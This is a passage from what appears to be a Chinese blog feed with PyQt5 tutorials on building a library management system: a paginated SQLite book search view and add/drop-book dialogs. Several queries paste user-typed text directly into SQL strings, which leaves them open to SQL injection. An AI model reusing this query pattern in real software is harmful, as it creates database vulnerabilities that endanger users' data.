Hlayout.addWidget(self.jumpToButton)</span><br><span class="line">        Hlayout.addWidget(self.prevButton)</span><br><span class="line">        Hlayout.addWidget(self.backButton)</span><br><span class="line">        widget &#x3D; QWidget()</span><br><span class="line">        widget.setLayout(Hlayout)</span><br><span class="line">        widget.setFixedWidth(300)</span><br><span class="line">        self.Hlayout2.addWidget(widget)</span><br><span class="line"></span><br><span class="line">        # tableView</span><br><span class="line">        # 序号，书名，书号，作者，分类，出版社，出版时间，库存，剩余可借</span><br><span class="line">        self.db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        self.db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        self.db.open()</span><br><span class="line">        self.tableView &#x3D; QTableView()</span><br><span class="line">        self.tableView.horizontalHeader().setStretchLastSection(True)</span><br><span class="line">        self.tableView.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        self.tableView.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line">        self.queryModel &#x3D; QSqlQueryModel()</span><br><span class="line">        self.searchButtonClicked()</span><br><span class="line">        self.tableView.setModel(self.queryModel)</span><br><span class="line"></span><br><span class="line">        self.queryModel.setHeaderData(0, Qt.Horizontal, &quot;书名&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(1, Qt.Horizontal, &quot;书号&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(2, Qt.Horizontal, &quot;作者&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(3, Qt.Horizontal, &quot;分类&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(4, Qt.Horizontal, &quot;出版社&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(5, Qt.Horizontal, &quot;出版时间&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(6, Qt.Horizontal, &quot;库存&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(7, Qt.Horizontal, &quot;剩余可借&quot;)</span><br><span class="line">        self.queryModel.setHeaderData(8, Qt.Horizontal, &quot;总借阅次数&quot;)</span><br><span class="line"></span><br><span class="line">        self.layout.addLayout(self.Hlayout1)</span><br><span class="line">        self.layout.addWidget(self.tableView)</span><br><span class="line">        self.layout.addLayout(self.Hlayout2)</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line">        self.searchButton.clicked.connect(self.searchButtonClicked)</span><br><span class="line">        self.prevButton.clicked.connect(self.prevButtonClicked)</span><br><span class="line">        self.backButton.clicked.connect(self.backButtonClicked)</span><br><span class="line">        self.jumpToButton.clicked.connect(self.jumpToButtonClicked)</span><br><span class="line">        self.searchEdit.returnPressed.connect(self.searchButtonClicked)</span><br><span class="line"></span><br><span class="line">    def setButtonStatus(self):</span><br><span class="line">        if(self.currentPage&#x3D;&#x3D;self.totalPage):</span><br><span class="line">            self.prevButton.setEnabled(True)</span><br><span class="line">            self.backButton.setEnabled(False)</span><br><span class="line">        if(self.currentPage&#x3D;&#x3D;1):</span><br><span class="line">            self.backButton.setEnabled(True)</span><br><span class="line">            self.prevButton.setEnabled(False)</span><br><span class="line">        if(self.currentPage&lt;self.totalPage and self.currentPage&gt;1):</span><br><span class="line">            self.prevButton.setEnabled(True)</span><br><span class="line">            self.backButton.setEnabled(True)</span><br><span class="line"></span><br><span class="line">    # 得到记录数</span><br><span class="line">    def getTotalRecordCount(self):</span><br><span class="line">        self.queryModel.setQuery(&quot;SELECT * FROM Book&quot;)</span><br><span class="line">        self.totalRecord &#x3D; self.queryModel.rowCount()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 得到总页数</span><br><span class="line">    def getPageCount(self):</span><br><span class="line">        self.getTotalRecordCount()</span><br><span class="line">        # 上取整</span><br><span class="line">        self.totalPage &#x3D; int((self.totalRecord + self.pageRecord - 1) &#x2F; self.pageRecord)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 分页记录查询</span><br><span class="line">    def recordQuery(self, index):</span><br><span class="line">        queryCondition &#x3D; &quot;&quot;</span><br><span class="line">        conditionChoice &#x3D; self.condisionComboBox.currentText()</span><br><span class="line">        if (conditionChoice &#x3D;&#x3D; &quot;按书名查询&quot;):</span><br><span class="line">            conditionChoice &#x3D; &#39;BookName&#39;</span><br><span class="line">        elif (conditionChoice &#x3D;&#x3D; &quot;按书号查询&quot;):</span><br><span class="line">            conditionChoice &#x3D; &#39;BookId&#39;</span><br><span class="line">        elif (conditionChoice &#x3D;&#x3D; &quot;按作者查询&quot;):</span><br><span class="line">            conditionChoice &#x3D; &#39;Auth&#39;</span><br><span class="line">        elif (conditionChoice &#x3D;&#x3D; &#39;按分类查询&#39;):</span><br><span class="line">            conditionChoice &#x3D; &#39;Category&#39;</span><br><span class="line">        else:</span><br><span class="line">            conditionChoice &#x3D; &#39;Publisher&#39;</span><br><span class="line"></span><br><span class="line">        if (self.searchEdit.text() &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            queryCondition &#x3D; &quot;select * from Book&quot;</span><br><span class="line">            self.queryModel.setQuery(queryCondition)</span><br><span class="line">            self.totalRecord &#x3D; self.queryModel.rowCount()</span><br><span class="line">            self.totalPage &#x3D; int((self.totalRecord + self.pageRecord - 1) &#x2F; self.pageRecord)</span><br><span class="line">            label &#x3D; &quot;&#x2F;&quot; + str(int(self.totalPage)) + &quot;页&quot;</span><br><span class="line">            self.pageLabel.setText(label)</span><br><span class="line">            queryCondition &#x3D; (&quot;select * from Book ORDER BY %s  limit %d,%d &quot; % (conditionChoice,index, self.pageRecord))</span><br><span class="line">            self.queryModel.setQuery(queryCondition)</span><br><span class="line">            self.setButtonStatus()</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        # 得到模糊查询条件</span><br><span class="line">        temp &#x3D; self.searchEdit.text()</span><br><span class="line">        s &#x3D; &#39;%&#39;</span><br><span class="line">        for i in range(0, len(temp)):</span><br><span class="line">            s &#x3D; s + temp[i] + &quot;%&quot;</span><br><span class="line">        queryCondition &#x3D; (&quot;SELECT * FROM Book WHERE %s LIKE &#39;%s&#39; ORDER BY %s &quot; % (</span><br><span class="line">            conditionChoice, s,conditionChoice))</span><br><span class="line">        self.queryModel.setQuery(queryCondition)</span><br><span class="line">        self.totalRecord &#x3D; self.queryModel.rowCount()</span><br><span class="line">        # 当查询无记录时的操作</span><br><span class="line">        if(self.totalRecord&#x3D;&#x3D;0):</span><br><span class="line">            print(QMessageBox.information(self,&quot;提醒&quot;,&quot;查询无记录&quot;,QMessageBox.Yes,QMessageBox.Yes))</span><br><span class="line">            queryCondition &#x3D; &quot;select * from Book&quot;</span><br><span class="line">            self.queryModel.setQuery(queryCondition)</span><br><span class="line">            self.totalRecord &#x3D; self.queryModel.rowCount()</span><br><span class="line">            self.totalPage &#x3D; int((self.totalRecord + self.pageRecord - 1) &#x2F; self.pageRecord)</span><br><span class="line">            label &#x3D; &quot;&#x2F;&quot; + str(int(self.totalPage)) + &quot;页&quot;</span><br><span class="line">            self.pageLabel.setText(label)</span><br><span class="line">            queryCondition &#x3D; (&quot;select * from Book ORDER BY %s  limit %d,%d &quot; % (conditionChoice,index, self.pageRecord))</span><br><span class="line">            self.queryModel.setQuery(queryCondition)</span><br><span class="line">            self.setButtonStatus()</span><br><span class="line">            return</span><br><span class="line">        self.totalPage &#x3D; int((self.totalRecord + self.pageRecord - 1) &#x2F; self.pageRecord)</span><br><span class="line">        label &#x3D; &quot;&#x2F;&quot; + str(int(self.totalPage)) + &quot;页&quot;</span><br><span class="line">        self.pageLabel.setText(label)</span><br><span class="line">        queryCondition &#x3D; (&quot;SELECT * FROM Book WHERE %s LIKE &#39;%s&#39; ORDER BY %s LIMIT %d,%d &quot; % (</span><br><span class="line">            conditionChoice, s, conditionChoice,index, self.pageRecord))</span><br><span class="line">        self.queryModel.setQuery(queryCondition)</span><br><span class="line">        self.setButtonStatus()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 点击查询</span><br><span class="line">    def searchButtonClicked(self):</span><br><span class="line">        self.currentPage &#x3D; 1</span><br><span class="line">        self.pageEdit.setText(str(self.currentPage))</span><br><span class="line">        self.getPageCount()</span><br><span class="line">        s &#x3D; &quot;&#x2F;&quot; + str(int(self.totalPage)) + &quot;页&quot;</span><br><span class="line">        self.pageLabel.setText(s)</span><br><span class="line">        index &#x3D; (self.currentPage - 1) * self.pageRecord</span><br><span class="line">        self.recordQuery(index)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 向前翻页</span><br><span class="line">    def prevButtonClicked(self):</span><br><span class="line">        self.currentPage -&#x3D; 1</span><br><span class="line">        if (self.currentPage &lt;&#x3D; 1):</span><br><span class="line">            self.currentPage &#x3D; 1</span><br><span class="line">        self.pageEdit.setText(str(self.currentPage))</span><br><span class="line">        index &#x3D; (self.currentPage - 1) * self.pageRecord</span><br><span class="line">        self.recordQuery(index)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 向后翻页</span><br><span class="line">    def backButtonClicked(self):</span><br><span class="line">        self.currentPage +&#x3D; 1</span><br><span class="line">        if (self.currentPage &gt;&#x3D; int(self.totalPage)):</span><br><span class="line">            self.currentPage &#x3D; int(self.totalPage)</span><br><span class="line">        self.pageEdit.setText(str(self.currentPage))</span><br><span class="line">        index &#x3D; (self.currentPage - 1) * self.pageRecord</span><br><span class="line">        self.recordQuery(index)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    # 点击跳转</span><br><span class="line">    def jumpToButtonClicked(self):</span><br><span class="line">        if (self.pageEdit.text().isdigit()):</span><br><span class="line">            self.currentPage &#x3D; int(self.pageEdit.text())</span><br><span class="line">            if (self.currentPage &gt; self.totalPage):</span><br><span class="line">                self.currentPage &#x3D; self.totalPage</span><br><span class="line">            if (self.currentPage &lt;&#x3D; 1):</span><br><span class="line">                self.currentPage &#x3D; 1</span><br><span class="line">        else:</span><br><span class="line">            self.currentPage &#x3D; 1</span><br><span class="line">        index &#x3D; (self.currentPage - 1) * self.pageRecord</span><br><span class="line">        self.pageEdit.setText(str(self.currentPage))</span><br><span class="line">        self.recordQuery(index)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; BookStorageViewer()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h2><span id="pdai-ma-fen-xi">代码分析</span><a href="#pdai-ma-fen-xi" class="header-anchor">#</a></h2><ul><li>主要使用了 Qt自带的<code>QTableView</code>和<code>QSqlQueryModel</code>实现了查询和展示结果</li><li>也有得到记录数，总页数，点击查询，跳转，前一页，后一页的函数，这些都很好看懂，同时还设置了按钮的可用性</li><li>分页记录查询函数是这里面最主要的一个函数，首先看查询种类 ，分别有判断为空 ，模糊查询，查询无果的处理</li><li>在跳转前有对输入数据的检测合法与否</li></ul><blockquote><p>这里还没有实现动态刷新，因为这个功能是用其他部件信号传输实现的</p></blockquote><h2><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h2><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135606.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135616.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135621.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（5）——添加/淘汰书籍对话框设计</title>
    <url>/65cd36fc.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析：</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>在图书管管理系统主页上，我们有添加和淘汰的功能 ，通过按钮弹出对话框进行添加和淘汰书籍，这里我们就来完成一下这两个功能。</p><a id="more"></a><h2><span id="ptian-jia-tu-shu-gong-neng">添加图书功能</span><a href="#ptian-jia-tu-shu-gong-neng" class="header-anchor">#</a></h2><blockquote><p>添加图书，需要管理员添加以下信息</p></blockquote><ul><li>书名</li><li>书号</li><li>作者名</li><li>分类（分类已经规定，只需要选择对应的种类就可以了）</li><li>出版社</li><li>出版日期</li><li>添加的数量</li></ul><h3><span id="ptian-jia-tu-shu-dui-hua-kuang-dai-ma">添加图书对话框代码</span><a href="#ptian-jia-tu-shu-dui-hua-kuang-dai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import time</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class addBookDialog(QDialog):</span><br><span class="line">    add_book_success_signal &#x3D; pyqtSignal()</span><br><span class="line"></span><br><span class="line">    def __init__(self, parent&#x3D;None):</span><br><span class="line">        super(addBookDialog, self).__init__(parent)</span><br><span class="line">        self.setUpUI()</span><br><span class="line">        self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;添加书籍&quot;)</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 书名，书号，作者，分类，添加数量.出版社,出版日期</span><br><span class="line">        # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类</span><br><span class="line">        BookCategory &#x3D; [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot;</span><br><span class="line">            , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;]</span><br><span class="line">        self.resize(300, 400)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        # Label控件</span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot;  添加书籍&quot;)</span><br><span class="line">        self.bookNameLabel &#x3D; QLabel(&quot;书    名:&quot;)</span><br><span class="line">        self.bookIdLabel &#x3D; QLabel(&quot;书    号:&quot;)</span><br><span class="line">        self.authNameLabel &#x3D; QLabel(&quot;作    者:&quot;)</span><br><span class="line">        self.categoryLabel &#x3D; QLabel(&quot;分    类:&quot;)</span><br><span class="line">        self.publisherLabel &#x3D; QLabel(&quot;出 版 社:&quot;)</span><br><span class="line">        self.publishDateLabel &#x3D; QLabel(&quot;出版日期:&quot;)</span><br><span class="line">        self.addNumLabel &#x3D; QLabel(&quot;数    量:&quot;)</span><br><span class="line"></span><br><span class="line">        # button控件</span><br><span class="line">        self.addBookButton &#x3D; QPushButton(&quot;添 加&quot;)</span><br><span class="line"></span><br><span class="line">        # lineEdit控件</span><br><span class="line">        self.bookNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.bookIdEdit &#x3D; QLineEdit()</span><br><span class="line">        self.authNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.categoryComboBox &#x3D; QComboBox()</span><br><span class="line">        self.categoryComboBox.addItems(BookCategory)</span><br><span class="line">        self.publisherEdit &#x3D; QLineEdit()</span><br><span class="line">        self.publishTime &#x3D; QDateTimeEdit()</span><br><span class="line">        self.publishTime.setDisplayFormat(&quot;yyyy-MM-dd&quot;)</span><br><span class="line">        # self.publishDateEdit &#x3D; QLineEdit()</span><br><span class="line">        self.addNumEdit &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setMaxLength(10)</span><br><span class="line">        self.bookIdEdit.setMaxLength(6)</span><br><span class="line">        self.authNameEdit.setMaxLength(10)</span><br><span class="line">        self.publisherEdit.setMaxLength(10)</span><br><span class="line">        self.addNumEdit.setMaxLength(12)</span><br><span class="line">        self.addNumEdit.setValidator(QIntValidator())</span><br><span class="line"></span><br><span class="line">        # 添加进formlayout</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.bookNameLabel, self.bookNameEdit)</span><br><span class="line">        self.layout.addRow(self.bookIdLabel, self.bookIdEdit)</span><br><span class="line">        self.layout.addRow(self.authNameLabel, self.authNameEdit)</span><br><span class="line">        self.layout.addRow(self.categoryLabel, self.categoryComboBox)</span><br><span class="line">        self.layout.addRow(self.publisherLabel, self.publisherEdit)</span><br><span class="line">        self.layout.addRow(self.publishDateLabel, self.publishTime)</span><br><span class="line">        self.layout.addRow(self.addNumLabel, self.addNumEdit)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.addBookButton)</span><br><span class="line"></span><br><span class="line">        # 设置字体</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        self.bookNameLabel.setFont(font)</span><br><span class="line">        self.bookIdLabel.setFont(font)</span><br><span class="line">        self.authNameLabel.setFont(font)</span><br><span class="line">        self.categoryLabel.setFont(font)</span><br><span class="line">        self.publisherLabel.setFont(font)</span><br><span class="line">        self.publishDateLabel.setFont(font)</span><br><span class="line">        self.addNumLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setFont(font)</span><br><span class="line">        self.bookIdEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setFont(font)</span><br><span class="line">        self.publisherEdit.setFont(font)</span><br><span class="line">        self.publishTime.setFont(font)</span><br><span class="line">        self.categoryComboBox.setFont(font)</span><br><span class="line">        self.addNumEdit.setFont(font)</span><br><span class="line"></span><br><span class="line">        # button设置</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.addBookButton.setFont(font)</span><br><span class="line">        self.addBookButton.setFixedHeight(32)</span><br><span class="line">        self.addBookButton.setFixedWidth(140)</span><br><span class="line"></span><br><span class="line">        # 设置间距</span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line"></span><br><span class="line">        self.addBookButton.clicked.connect(self.addBookButtonCicked)</span><br><span class="line"></span><br><span class="line">    def addBookButtonCicked(self):</span><br><span class="line">        bookName &#x3D; self.bookNameEdit.text()</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        authName &#x3D; self.authNameEdit.text()</span><br><span class="line">        bookCategory &#x3D; self.categoryComboBox.currentText()</span><br><span class="line">        publisher &#x3D; self.publisherEdit.text()</span><br><span class="line">        publishTime &#x3D; self.publishTime.text()</span><br><span class="line">        addBookNum &#x3D; self.addNumEdit.text()</span><br><span class="line">        if (</span><br><span class="line">                bookName &#x3D;&#x3D; &quot;&quot; or bookId &#x3D;&#x3D; &quot;&quot; or authName &#x3D;&#x3D; &quot;&quot; or bookCategory &#x3D;&#x3D; &quot;&quot; or publisher &#x3D;&#x3D; &quot;&quot; or publishTime &#x3D;&#x3D; &quot;&quot; or addBookNum &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;有字段为空，添加失败&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        else:</span><br><span class="line">            addBookNum &#x3D; int(addBookNum)</span><br><span class="line">            db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">            db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">            db.open()</span><br><span class="line">            query &#x3D; QSqlQuery()</span><br><span class="line">            # 如果已存在，则update Book表的现存量，剩余可借量，不存在，则insert Book表，同时insert buyordrop表</span><br><span class="line">            sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">            query.exec_(sql)</span><br><span class="line">            if (query.next()):</span><br><span class="line">                sql &#x3D; &quot;UPDATE Book SET NumStorage&#x3D;NumStorage+%d,NumCanBorrow&#x3D;NumCanBorrow+%d WHERE BookId&#x3D;&#39;%s&#39;&quot; % (</span><br><span class="line">                    addBookNum, addBookNum, bookId)</span><br><span class="line">            else:</span><br><span class="line">                sql &#x3D; &quot;INSERT INTO book VALUES (&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,%d,%d,0)&quot; % (</span><br><span class="line">                    bookName, bookId, authName, bookCategory, publisher, publishTime, addBookNum, addBookNum)</span><br><span class="line">            query.exec_(sql)</span><br><span class="line">            db.commit()</span><br><span class="line">            # 插入droporinsert表</span><br><span class="line">            timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">            sql &#x3D; &quot;INSERT INTO buyordrop VALUES (&#39;%s&#39;,&#39;%s&#39;,1,%d)&quot; % (bookId, timenow, addBookNum)</span><br><span class="line">            query.exec_(sql)</span><br><span class="line">            db.commit()</span><br><span class="line">            print(QMessageBox.information(self, &quot;提示&quot;, &quot;添加书籍成功!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            self.add_book_success_signal.emit()</span><br><span class="line">            self.close()</span><br><span class="line">            self.clearEdit()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def clearEdit(self):</span><br><span class="line">        self.bookNameEdit.clear()</span><br><span class="line">        self.bookIdEdit.clear()</span><br><span class="line">        self.authNameEdit.clear()</span><br><span class="line">        self.addNumEdit.clear()</span><br><span class="line">        self.publisherEdit.clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; addBookDialog()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><p>对于分类，使用了 <code>QComboBox</code><br>对于时间，选择了<code>QDateTimeEdit</code>，并且规定了时间的格式<br>在<code>setUpUI</code>中可以看到，当点击<strong>添加图书</strong>按钮时<code>addBookButtonClicked</code>函数</p><h3><span id="paddbookbuttonclicked-han-shu-shi-xian-luo-ji">addBookButtonClicked函数实现逻辑</span><a href="#paddbookbuttonclicked-han-shu-shi-xian-luo-ji" class="header-anchor">#</a></h3><p>虽然我注释了，但是这里还是想重新写一下，逻辑如下</p><ul><li>如果存在有空值，警告</li><li>添加的书已存在，就直接加上本数</li><li>本来不存在，则开始插入数据</li></ul><h3><span id="pshi-xian-xiao-guo">实现效果:</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135535.jpg" alt="这里写图片描述"><br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2020-07-11-135539.jpg" alt="这里写图片描述"></p><h2><span id="ptao-tai-tu-shu-gong-neng">淘汰图书功能</span><a href="#ptao-tai-tu-shu-gong-neng" class="header-anchor">#</a></h2><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h3><p>从实现看与添加图书差不多，但是为了方便，我只允许管理员添加书本号，然后自动匹配到书籍信息填充，管理员只需再添加一个淘汰数量就行了</p><h3><span id="pdai-ma">代码</span><a href="#pdai-ma" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class dropBookDialog(QDialog):</span><br><span class="line">    drop_book_successful_signal&#x3D;pyqtSignal()</span><br><span class="line"></span><br><span class="line">    def __init__(self, parent&#x3D;None):</span><br><span class="line">        super(dropBookDialog, self).__init__(parent)</span><br><span class="line">        self.setUpUI()</span><br><span class="line">        self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;删除书籍&quot;)</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 书名，书号，作者，分类，添加数量.出版社,出版日期</span><br><span class="line">        # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类</span><br><span class="line">        BookCategory &#x3D; [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot;</span><br><span class="line">            , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;]</span><br><span class="line">        self.resize(300, 400)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        # Label控件</span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot;  淘汰书籍&quot;)</span><br><span class="line">        self.bookNameLabel &#x3D; QLabel(&quot;书    名:&quot;)</span><br><span class="line">        self.bookIdLabel &#x3D; QLabel(&quot;书    号:&quot;)</span><br><span class="line">        self.authNameLabel &#x3D; QLabel(&quot;作    者:&quot;)</span><br><span class="line">        self.categoryLabel &#x3D; QLabel(&quot;分    类:&quot;)</span><br><span class="line">        self.publisherLabel &#x3D; QLabel(&quot;出 版 社:&quot;)</span><br><span class="line">        self.publishDateLabel &#x3D; QLabel(&quot;出版日期:&quot;)</span><br><span class="line">        self.dropNumLabel &#x3D; QLabel(&quot;数    量:&quot;)</span><br><span class="line"></span><br><span class="line">        # button控件</span><br><span class="line">        self.dropBookButton &#x3D; QPushButton(&quot;淘 汰&quot;)</span><br><span class="line"></span><br><span class="line">        # lineEdit控件</span><br><span class="line">        self.bookNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.bookIdEdit &#x3D; QLineEdit()</span><br><span class="line">        self.authNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.categoryComboBox &#x3D; QComboBox()</span><br><span class="line">        self.categoryComboBox.addItems(BookCategory)</span><br><span class="line">        self.publisherEdit &#x3D; QLineEdit()</span><br><span class="line">        self.publishTime &#x3D; QLineEdit()</span><br><span class="line">        # self.publishDateEdit &#x3D; QLineEdit()</span><br><span class="line">        self.dropNumEdit &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setMaxLength(10)</span><br><span class="line">        self.bookIdEdit.setMaxLength(6)</span><br><span class="line">        self.authNameEdit.setMaxLength(10)</span><br><span class="line">        self.publisherEdit.setMaxLength(10)</span><br><span class="line">        self.dropNumEdit.setMaxLength(12)</span><br><span class="line">        self.dropNumEdit.setValidator(QIntValidator())</span><br><span class="line"></span><br><span class="line">        # 添加进formlayout</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.bookNameLabel, self.bookNameEdit)</span><br><span class="line">        self.layout.addRow(self.bookIdLabel, self.bookIdEdit)</span><br><span class="line">        self.layout.addRow(self.authNameLabel, self.authNameEdit)</span><br><span class="line">        self.layout.addRow(self.categoryLabel, self.categoryComboBox)</span><br><span class="line">        self.layout.addRow(self.publisherLabel, self.publisherEdit)</span><br><span class="line">        self.layout.addRow(self.publishDateLabel, self.publishTime)</span><br><span class="line">        self.layout.addRow(self.dropNumLabel, self.dropNumEdit)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.dropBookButton)</span><br><span class="line"></span><br><span class="line">        # 设置字体</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        self.bookNameLabel.setFont(font)</span><br><span class="line">        self.bookIdLabel.setFont(font)</span><br><span class="line">        self.authNameLabel.setFont(font)</span><br><span class="line">        self.categoryLabel.setFont(font)</span><br><span class="line">        self.publisherLabel.setFont(font)</span><br><span class="line">        self.publishDateLabel.setFont(font)</span><br><span class="line">        self.dropNumLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setFont(font)</span><br><span class="line">        self.bookNameEdit.setReadOnly(True)</span><br><span class="line">        